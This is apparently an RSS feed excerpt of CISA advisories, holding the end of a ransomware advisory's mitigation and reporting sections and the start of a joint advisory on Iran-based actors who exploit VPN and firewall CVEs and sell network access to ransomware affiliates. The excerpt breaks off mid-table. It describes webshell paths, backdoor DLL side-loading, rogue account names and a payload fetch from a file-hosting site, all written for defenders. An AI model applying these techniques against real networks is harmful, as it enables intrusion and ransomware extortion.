<li><strong>Segment networks</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CPG 2.F</a>] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.</li>
<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>]. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.</li>
<li><strong>Install, regularly update, and enable real time detection for antivirus</strong> <strong>software on all hosts.</strong></li>
<li><strong>Implement Secure Logging Collection and Storage Practices&nbsp;</strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#LogCollection2T\" title=\"Log Collection (2.T)\">CPG 2.T</a>].<strong>&nbsp;</strong>Learn more about logging best practices by referencing <a href=\"https://www.cisa.gov/resources-tools/services/logging-made-easy\" title=\"Logging Made Easy\">CISA’s Logging Made Easy</a> resources.</li>
<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts.</li>
<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege.</li>
<li><strong>Disable unused ports.</strong></li>
<li><strong>Implement and enforce email security policies</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#EmailSecurity2M\" title=\"Email Security (2.M)\">CPG 2.M</a>].</li>
<li><strong>Disable macros by default</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DisableMacrosbyDefault2N\" title=\"Disable Macros by Default (2.N)\">CPG 2.N</a>].</li>
<li><strong>Consider adding an email banner to emails</strong> received from outside your organization.</li>
<li><strong>Disable hyperlinks in received emails.</strong></li>
<li><strong>Implement time-based access for accounts set at the admin level and higher.</strong> For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.</li>
<li><strong>Disable command-line and scripting activities and permissions.</strong> Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.</li>
<li><strong>Maintain offline backups of data, and regularly maintain backup and restoration</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"System Backups (2.R)\">CPG 2.R</a>]. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.</li>
<li><strong>Ensure all backup data is encrypted,</strong> immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.</li>
</ul>
<h3>Software Manufacturers</h3>
<p>The above mitigations apply to enterprises and critical infrastructure organizations with on-premises or hybrid environments. Recognizing that insecure software is the root cause of many of these flaws and that the responsibility should not be on the end user, CISA urges software manufacturers to implement the following to reduce the prevalence of identified or exploited issues (e.g., misconfigurations, weak passwords, and other weaknesses identified and exploited through the assessment team):</p>
<ul>
<li><strong>Embed security into product architecture</strong> throughout the entire software development lifecycle (SDLC).</li>
<li><strong>Mandate MFA, ideally phishing-resistant MFA, for privileged users</strong> and make MFA a default, rather than opt-in, feature.</li>
</ul>
<p>These mitigations align with tactics provided in the joint guide <a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design\" title=\"Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software\">Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software</a>. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.</p>
<p>For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design</a> webpage.</p>
<h2><strong>Validate Security Controls</strong></h2>
<p>In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring organizations recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see<strong>&nbsp;Table 6–Table 17</strong>).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>CISA, FBI, MS-ISAC, and HHS recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h2><strong>Resources</strong></h2>
<ul>
<li>#<a href=\"https://www.stopransomware.gov/\">StopRansomware</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>
<li>Resource to reduce the risk of a ransomware attack: <a href=\"https://www.cisa.gov/resources-tools/resources/stopransomware-guide\">#StopRansomware Guide</a>.</li>
<li>No-cost cyber hygiene services: <a href=\"https://www.cisa.gov/cyber-hygiene-services\">Cyber Hygiene Services</a> and <a href=\"https://github.com/cisagov/cset/releases/tag/v10.3.0.0\">Ransomware Readiness Assessment</a>.</li>
<li>Health and Human Services <a href=\"https://hhscyber.hhs.gov/\">HPH Cybersecurity Gateway</a> hosts the HPH CPGs and links to HHS cybersecurity resources.</li>
</ul>
<h2><strong>References</strong></h2>
<ol>
<li><a href=\"https://www.fortinet.com/blog/threat-research/ransomware-roundup-knight\" title=\"Ransomware Roundup - Knight\">Ransomware Roundup - Knight | FortiGuard Labs (fortinet.com)</a></li>
<li><a href=\"https://redskyalliance.org/xindustry/knight-ransomware\" title=\"Knight Ransomware\">Knight Ransomware - X-Industry - Red Sky Alliance</a></li>
<li><a href=\"https://www.uptycs.com/blog/threat-research-report-team/cyclops-ransomware-stealer-combo\" title=\"Exploring a Dual Threat: Cyclops Ransomware &amp; Stealer Combo\">Cyclops Ransomware and Stealer Combo: Exploring a Dual Threat (uptycs.com)</a></li>
<li><a href=\"https://www.bleepingcomputer.com/news/security/knight-ransomware-distributed-in-fake-tripadvisor-complaint-emails/\" title=\"Knight ransomware distributed in fake Tripadvisor complaint emails\">Knight ransomware distributed in fake Tripadvisor complaint emails (bleepingcomputer.com)</a></li>
</ol>
<h2><strong>Reporting</strong></h2>
<p>Your organization has no obligation to respond or provide information to the FBI in response to this joint advisory. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.</p>
<p>The FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>The authoring organizations do not encourage paying a ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s <a href=\"https://www.ic3.gov/Home/ComplaintChoice\" title=\"Internet Crime Complain Center (IC3)\">Internet Crime Complain Center (IC3)</a>, a <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>, or CISA via the agency’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting System</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov)\" title=\"Report to CISA\">report@cisa.gov</a>) or by calling 1-844-Say-CISA (1-844-729-2472).</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring organizations do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring organizations.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
") (pubDate nil "Thu, 29 Aug 2024 09:17:11 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/22102")) (item nil (title nil "Iran-based Cyber Actors Enabling Ransomware Attacks on US Organizations") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a") (description nil "<h2><strong>Summary</strong></h2>
<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Defense Cyber Crime Center (DC3) are releasing this joint Cybersecurity Advisory (CSA) to warn network defenders that, as of August 2024, a group of Iran-based cyber actors continues to exploit U.S. and foreign organizations. This includes organizations across several sectors in the U.S. (including in the education, finance, healthcare, and defense sectors as well as local government entities) and other countries (including in Israel, Azerbaijan, and the United Arab Emirates). The FBI assesses a significant percentage of these threat actors’ operations against US organizations are intended to obtain and develop network access to then collaborate with ransomware affiliate actors to deploy ransomware. The FBI further assesses these Iran-based cyber actors are associated with the Government of Iran (GOI) and—separate from the ransomware activity—conduct computer network exploitation activity in support of the GOI (such as intrusions enabling the theft of sensitive technical data against organizations in Israel and Azerbaijan).</p>
<p>This CSA provides the threat actor’s tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs), as well as highlights similar activity from a previous advisory (<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-259a\" title=\"Iran-Based Threat Actor Exploits VPN Vulnerabilities\">Iran-Based Threat Actor Exploits VPN Vulnerabilities</a>) that the FBI and CISA published on Sept. 15, 2020. The information and guidance in this advisory are derived from FBI investigative activity and technical analysis of this group’s intrusion activity against U.S. organizations and engagements with numerous entities impacted by this malicious activity.</p>
<p>The FBI recommends all organizations follow guidance provided in the <strong>Mitigations</strong> section of this advisory to defend against the Iranian cyber actors’ activity.</p>
<p>If organizations believe they have been targeted or compromised by the Iranian cyber actors, the FBI and CISA recommend immediately contacting your <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI field office</a> for assistance and/or reporting the incident via CISA’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting Form</a> (see the <strong>Reporting&nbsp;</strong>section of this advisory for more details and contact methods).</p>
<p>For more information on Iran state-sponsored malicious cyber activity, see CISA’s <a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/iran\" title=\"Iran Cyber Threat Overview and Advisories\">Iran Cyber Threat</a> webpage.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/aa24-241a-iran-based-cyber-actors-enabling-ransomware-attacks-on-us-organizations_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-241A Iran-based Cyber Actors Enabling Ransomware Attacks on US Organizations</a>
    <span class=\"c-file__size\">(PDF,       582.01 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-241A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-241A STIX XML</a>
    <span class=\"c-file__size\">(XML,       29.02 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-241A-Iran-based-Cyber-Actors-Enabling-Ransomware-Attacks-on-US-Organizations.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-241A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       29.19 KB
  )</span>
  </div>
</div>
<h2><strong>Threat Actor Details</strong></h2>
<h3>Background on Threat Group and Prior Activity</h3>
<p>This advisory outlines activity by a specific group of Iranian cyber actors that has conducted a high volume of computer network intrusion attempts against U.S. organizations since 2017 and as recently as August 2024. Compromised organizations include U.S.-based schools, municipal governments, financial institutions, and healthcare facilities. This group is known in the private sector by the names Pioneer Kitten, Fox Kitten, UNC757, Parisite, RUBIDIUM, and Lemon Sandstorm.[<a href=\"https://attack.mitre.org/versions/v15/groups/G0117/\" title=\"Fox Kitten\">1</a>][<a href=\"https://www.crowdstrike.com/blog/who-is-pioneer-kitten/\" title=\"Who Is PIONEER KITTEN?\">2</a>] The actors also refer to themselves by the moniker Br0k3r, and as of 2024, they have been operating under the moniker “xplfinder” in their channels. FBI analysis and investigation indicate the group’s activity is consistent with a cyber actor with Iranian state-sponsorship.</p>
<p>The FBI previously observed these actors attempt to monetize their access to victim organizations on cyber marketplaces. A significant percentage of the group’s US-focused cyber activity is in furtherance of obtaining and maintaining technical access to victim networks to enable future ransomware attacks. The actors offer full domain control privileges, as well as domain admin credentials, to numerous networks worldwide. More recently, the FBI identified these actors collaborating directly with ransomware affiliates to enable encryption operations in exchange for a percentage of the ransom payments. These actors have collaborated with the ransomware affiliates NoEscape[<a href=\"https://www.sentinelone.com/anthology/noescape/\" title=\"NoEscape Ransomware: In-Depth Analysis, Detection, and Mitigation\">3</a>], Ransomhouse[<a href=\"https://www.sentinelone.com/anthology/ransomhouse/\" title=\"RansomHouse Ransomware: In-Depth Analysis, Detection, and Mitigation\">4</a>], and ALPHV (aka BlackCat) (<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-353a\" title=\"#StopRansomware: ALPHV Blackcat\">#StopRansomware: ALPHV Blackcat</a>). The Iranian cyber actors’ involvement in these ransomware attacks goes beyond providing access; they work closely with ransomware affiliates to lock victim networks and strategize on approaches to extort victims. The FBI assesses these actors do not disclose their Iran-based location to their ransomware affiliate contacts and are intentionally vague as to their nationality and origin.</p>
<p>Furthermore, the FBI has historically observed this actor conduct hack-and-leak campaigns, such as the late 2020 campaign known as Pay2Key.[<a href=\"https://attack.mitre.org/versions/v15/software/S0556/\" title=\"Pay2Key\">5</a>],[<a href=\"https://research.checkpoint.com/2020/ransomware-alert-pay2key/\" title=\"Ransomware Alert: Pay2Key\">6</a>] The actors operated a <code>.onion</code> site (reachable through the Tor browser) hosted on cloud infrastructure registered to an organization previously compromised by the actors. (The actors created the server leveraging their prior access to this victim.)&nbsp;Following the compromise and the subsequent unauthorized acquisition of victim data, the actors publicized news of their compromise (including on social media), tagging accounts of victim and media organizations, and leaking victim data on their <code>.onion</code> site. While this technique has traditionally been used to influence victims to pay ransoms, the FBI does not believe the objective of Pay2Key was to obtain ransom payments. Rather, the FBI assesses Pay2Key was an information operation aimed at undermining the security of Israel-based cyber infrastructure.</p>
<h3>Attribution Details</h3>
<p>FBI investigation identified that the Iranian cyber actors conduct malicious cyber activity, which FBI assessed to be in support of the GOI. The FBI judges this activity to be separate from the previously referenced ransomware-enabling activity. This group directs their activity towards countries and organizations consistent with Iranian state interests, and typically not of interest to the group’s ransomware affiliate contacts, such as U.S. defense sector networks, and those in Israel, Azerbaijan, United Arab Emirates. Instead, it is intended to steal sensitive information from these networks, suggesting the group maintains an association with the GOI. However, the group’s ransomware activities are likely not sanctioned by the GOI, as the actors have expressed concern for government monitoring of cryptocurrency movement associated with their malicious activity.</p>
<p>The group uses the Iranian company name Danesh Novin Sahand (identification number 14007585836), likely as a cover IT entity for the group’s malicious cyber activities.</p>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\">MITRE ATT&amp;CK<sup>®</sup></a><a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\"> Matrix for Enterprise</a> framework, version 15.1. See the <strong>MITRE ATT&amp;CK Tactics and Techniques</strong> section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<h3>Overview of Observed Tactics, Techniques, and Procedures</h3>
<p>The Iranian cyber actors’ initial intrusions rely upon exploits of remote external services on internet-facing assets to gain initial access to victim networks. As of July 2024, these actors have been observed scanning IP addresses hosting Check Point Security Gateways, probing for devices potentially vulnerable to CVE-2024-24919. As of April 2024, these actors have conducted mass scanning of IP addresses hosting Palo Alto Networks PAN-OS and GlobalProtect VPN devices. The actors were likely conducting reconnaissance and probing for devices vulnerable to CVE-2024-3400. Historically, this group has exploited organizations by leveraging CVE-2019-19781 and CVE-2023-3519 related to Citrix Netscaler, and CVE-2022-1388 related to BIG-IP F5 devices.</p>
<h3>Reconnaissance, Initial Access, Persistence, and Credential Access</h3>
<p>The actors have been observed using the Shodan search engine to identify and enumerate IP addresses that host devices vulnerable to a particular CVE. The actors’ initial access is usually obtained via exploiting a public-facing networking device, such as Citrix Netscaler (CVE-2019-19781 and CVE-2023-3519), F5 BIG-IP (CVE-2022-1388), Pulse Secure/Ivanti VPNs (CVE-2024-21887), and, more recently, PanOS firewalls (CVE-2024-3400) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>].</p>
<p>Following exploitation of vulnerable devices, the actors use the following techniques:</p>
<ul>
<li>Capture login credentials using webshells on compromised Netscaler devices and append to file named <code>netscaler.1</code> in the same directory as the webshell [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1056/\" title=\"Input Capture\">T1056</a>].</li>
<li>Create the directory <code>/var/vpn/themes/imgs/</code> on Citrix Netscaler devices to deploy a webshell [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>]. Malicious files deployed to this directory include:
<ul>
<li><code>netscaler.1</code></li>
<li><code>netscaler.php</code></li>
<li><code>ctxHeaderLogon.php</code></li>
</ul>
</li>
<li>Specifically related to Netscaler, place additional webshells on compromised devices immediately after system owners patch the exploited vulnerability [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>]. The following file locations and filenames have been observed on devices:
<ul>
<li><code>/netscaler/logon/LogonPoint/uiareas/ui_style.php</code></li>
<li><code>/netscaler/logon/sanpdebug.php&nbsp;</code></li>
</ul>
</li>
<li>Create the directory <code>/xui/common/images/</code> on targeted IP addresses [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1133/\">T1133</a>].</li>
<li>Create accounts on victim networks; observed names include “sqladmin$,” “adfsservice,” “IIS_Admin,” “iis-admin,” and “John McCain” [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account\">T1136.001</a>].</li>
<li>Request exemptions to the zero-trust application and security policies for tools they intend to deploy on a victim network [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a>].</li>
<li>Create malicious scheduled task SpaceAgentTaskMgrSHR in <code>Windows/Spaceport/</code> task folder. This task uses a DLL side-loading technique against the signed Microsoft SysInternals executable <code>contig.exe</code>, which may be renamed to <code>dllhost.ext</code>, to load a payload from version.dll. This file has been observed being executed from the Windows Downloads directory [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/\" title=\"Scheduled Task/Job\">T1053</a>].&nbsp;</li>
<li>Place a malicious backdoor version.dll in <code>C:\\Windows\\ADFS\\</code> directory [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>].</li>
<li>Use a scheduled task to load malware through installed backdoors [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/\" title=\"Scheduled Task/Job\">T1053</a>].</li>
<li>Deployment of Meshcentral to connect with compromised servers for remote access [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a>].</li>
<li>For persistence and as detection and mitigation occurs, the actors create a daily Windows service task with random eight characters and attempt execution of a similarly named DLL contained in the <code>C:\\Windows\\system32\\drivers</code>\\ directory. For example, a service named “test” was observed attempting to load a file located at <code>C:\\WINDOWS\\system32\\drivers\\test.sys</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/\" title=\"Server Software Component\">T1505</a>].</li>
</ul>
<h3>Execution, Privilege Escalation, and Defense Evasion</h3>
<ul>
<li>Repurpose compromised credentials from exploiting networking devices, such as Citrix Netscaler, to log into other applications (i.e., Citrix XenDesktop) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/003/\" title=\"Valid Accounts: Local Accounts\">T1078.003</a>].</li>
<li>Repurpose administrative credentials of network administrators to log into domain controllers and other infrastructure on victim networks [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a>].</li>
<li>Use administrator credentials to disable antivirus and security software, and lower PowerShell policies to a less secure level [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/010/\" title=\"Impair Defenses: Downgrade Attack\">T1562.010</a>].</li>
<li>Attempt to enter security exemption tickets to the network security device or contractor to get the actor’s tools allowlisted <a>[</a><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].</li>
<li>Use a compromised administrator account to initiate a remote desktop session to another server on the network. In one instance, the FBI observed this technique being used to attempt to start Microsoft Windows PowerShell Integrated Scripted Environment (ISE) to run the command “Invoke-WebRequest” with a URI including <code>files.catbox[.]moe</code>. Catbox is a free, online file hosting site the actors use as a repository/hosting mechanism [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>].</li>
</ul>
<h3>Discovery</h3>
<ul>
<li>Export system registry hives and network firewall configurations on compromised servers [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1012/\" title=\"Query Registry\">T1012</a>].</li>
<li>Exfiltrate account usernames from the victim domain controller, as well as access configuration files and logs—presumably to gather network and user account information for use in further exploitation efforts [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a>].</li>
</ul>
<h3>Command and Control</h3>
<ul>
<li>Install “AnyDesk” remote access program as a backup access method [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a>].</li>
<li>Enable servers to use Windows PowerShell Web Access [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>].</li>
<li>Use the open source tunneling tool Ligolo (ligolo/ligolo-ng) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>].</li>
<li>Use NGROK (ngrok[.]io) deployment to create outbound connections to a random subdomain [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>].</li>
</ul>
<h3>Exfiltration and Impact</h3>
<p>After infiltrating victim networks, the actors collaborate with ransomware affiliates (including NoEscape, Ransomhouse, and ALPHV [aka BlackCat]) in exchange for a percentage of the ransom payments by providing affiliates with access to victim networks, locking victim networks, and strategizing to extort victims <a>[</a><a href=\"https://attack.mitre.org/versions/v15/techniques/T1657/\" title=\"Financial Theft\">T1657</a>]. The actors also conduct what is assessed to be separate set of malicious activity—stealing sensitive data from victims [<a href=\"https://attack.mitre.org/versions/v15/tactics/TA0010/\" title=\"Exfiltration\">TA0010</a>], likely in support of the GOI.</p>
<h2><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See <strong>Table 1</strong> to <strong>Table 9</strong> for all referenced threat actor tactics and techniques in this advisory.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1. Reconnaissance</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Search Open Technical Databases</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a></td>
<td>Iranian cyber actors use Shodan (<code>Shodan[.]io</code>) to identify internet infrastructure hosting devices vulnerable to particular CVEs.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2. Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>
<p>Iranian cyber actors scan and exploit public-facing networking devices, including the following devices and associated CVEs:</p>
<ul>
<li>Citrix Netscaler (CVEs-2019-19781 and CVE-2023-3519)</li>
<li>F5 BIG-IP (CVE-2022-1388)</li>
<li>Pulse Secure/Ivanti VPNs (CVE-2024-21887)</li>
<li>PanOS firewalls (CVE-2024-3400)</li>
<li>Check Point Security Gateways (CVE-2024-24919)</li>
</ul>
</td>
</tr>
<tr>
<td>External Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1133/\" title=\"External Remote Services\">T1133</a></td>
<td>Iranian cyber actors create <code>/xui/common/images/</code> directory on targeted IP addresses.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3. Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Server Software Component: Web Shell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a></td>
<td>Iranian cyber actors capture login credentials on compromised Netscaler devices via deployed webshell; create a directory on Netscaler devices for webshell deployment; deploy webshells on compromised Netscaler devices in two directories (observed closely after system owning patching); and place the malicious backdoor <code>version.dll</code>.</td>
</tr>
<tr>
<td>Create Account (Local Account)</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account (Local Account)\">T1136.001</a></td>
<td>Iranian cyber actors create local accounts on victim networks.</td>
</tr>
<tr>
<td>Account Manipulation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a></td>
<td>Iranian cyber actors request exemptions to zero-trust application for tools they intend to deploy.</td>
</tr>
<tr>
<td>Scheduled Task/Job</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/\" title=\"Scheduled Task/Job\">T1053</a></td>
<td>Iranian cyber actors implement a scheduled task that uses a DLL side-loading technique and a scheduled task that loads malware through back doors.</td>
</tr>
<tr>
<td>Server Software Component</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/\" title=\"Server Software Component\">T1505</a></td>
<td>Iranian cyber actors implement the daily creation of a Windows service task for persistence as detection and mitigation occur.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4. Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts: Local Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/003/\" title=\"Valid Accounts: Local Accounts\">T1078.003</a></td>
<td>Iranian cyber actors repurpose compromised credentials (e.g., from a Netscaler device) to log into other applications.</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a></td>
<td>Iranian cyber actors repurpose administrative credentials of network admins to log into domain controllers and other infrastructure.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5. Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
